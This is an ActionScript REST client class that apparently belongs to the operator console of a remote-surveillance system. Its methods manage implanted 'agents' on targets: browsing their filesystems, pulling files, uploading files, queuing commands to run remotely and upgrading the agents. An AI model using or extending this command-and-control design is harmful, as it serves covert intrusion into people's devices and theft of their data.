package it.ht.rcs.console.agent.rest
{
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.agent.model.Agent;
  import it.ht.rcs.console.operation.model.Operation;
  import it.ht.rcs.console.target.model.Target;
  
  import mx.rpc.CallResponder;
  
  public class DBAgent extends _Super_DBAgent implements IDBAgent
  {
    
    public function DBAgent(host: String)
    {
      super();
      _serviceControl.baseURL = host;
    }
    
    public function all(onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = all_();
    }
    
    public function create(params:Object, operation:Operation, target:Target, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      params['operation'] = operation._id;
      if(target!=null)
      {
        params['target'] = target._id;
      }
    
      resp.token = create_(JSON.stringify(params)); 
    }
    
    public function destroy(id:String, permanent:Boolean=false, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_(JSON.stringify({_id: id, permanent: permanent}));
    }
    
    public function destroy_factory(id:String, permanent:Boolean=false, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_factory_(JSON.stringify({_id: id, permanent: permanent}));
    }
    
    public function purge(id:String, time:Number, size:Number, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = purge_(JSON.stringify({_id: id, purge: [time, size]}));
    }
    
    public function show(id:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = show_(id);
    }
    
    public function update(agent:Agent, property:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      property['_id'] = agent._id;
      resp.token = update_(JSON.stringify(property));
    } 
    
    public function add_config(agent:Agent, config: String, onResult:Function=null, onFault:Function=null):void
    {
      var params:Object = {};
      params['_id'] = agent._id;
      params['config'] = config;
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = add_config_(JSON.stringify(params));
    }
    
    public function del_config(agent:Agent, config_id: String, onResult:Function=null, onFault:Function=null):void
    {
      var params:Object = {};
      params['_id'] = agent._id;
      params['config_id'] = config_id;
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = del_config_(JSON.stringify(params));
    }
    
    public function update_config(agent:Agent, config_id: String, desc:String, onResult:Function=null, onFault:Function=null):void
    {
      var params:Object = {};
      params['_id'] = agent._id;
      params['config_id'] = config_id;
      params['desc'] = desc;
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = update_config_(JSON.stringify(params));
    }
    
    public function upgrade(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {      
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = upgrade_(JSON.stringify({_id: agent._id}));
    }
    
    public function downloads(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = downloads_(agent._id);
    }
    
    public function filesystems(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystems_(agent._id);
    }
    

    public function destroy_filesystem(agent:Agent, filesystemId:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_filesystem_(JSON.stringify({ _id: agent._id, filesystem: filesystemId }));
    }
    
    public function destroy_upload(agent:Agent, uploadId:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_upload_(JSON.stringify({ _id: agent._id, upload: uploadId }));
    }
    
    public function uploads(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = uploads_(agent._id);
    }
    
    public function create_upload(agent:Agent, filename:String, grid:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = create_upload_(JSON.stringify({ _id: agent._id, upload: {filename: filename, file: grid} }));
    }
    
    public function activate_ghost(agent:Agent, sync:Array, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = activate_ghost_(JSON.stringify({ _id: agent._id, sync: sync}));
    }
    
    public function filesystem(agentId:String, path:String, depth:int, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystem_(JSON.stringify({ _id: agentId, filesystem: {path: path, depth: depth} }));
    }
    
    public function move(agentId:String, targetId:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = move_(JSON.stringify({ _id: agentId, target: targetId}));
    }
    
    public function commands(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = exec_(agent._id);
    }
    
    public function create_download(agentId:String, path:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = create_download_(JSON.stringify({ _id: agentId, download: {path: path} }));
    }
    
    public function create_command(agent:Agent, command:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = create_exec_(JSON.stringify({ _id: agent._id, exec: {command:command} }));
    }
    
    
    
    public function destroy_download(agent:Agent, downloadId:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_download_(JSON.stringify({ _id: agent._id, download: downloadId }));
    }
    
    public function destroy_command(agent:Agent, commandId:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_exec_(JSON.stringify({ _id: agent._id, exec: commandId }));
    }
    
    public function can_upgrade(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = can_upgrade_(JSON.stringify({ _id: agent._id}));
    }
    
    public function soldier_version(agent:Agent, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = soldier_version_(JSON.stringify({platform: agent.platform}));
    }
    
    /**
     * Override super.init() to provide any initialization customization if needed.
     */
    protected override function preInitializeService():void
    {
      super.preInitializeService();
    }
    
  }
  
}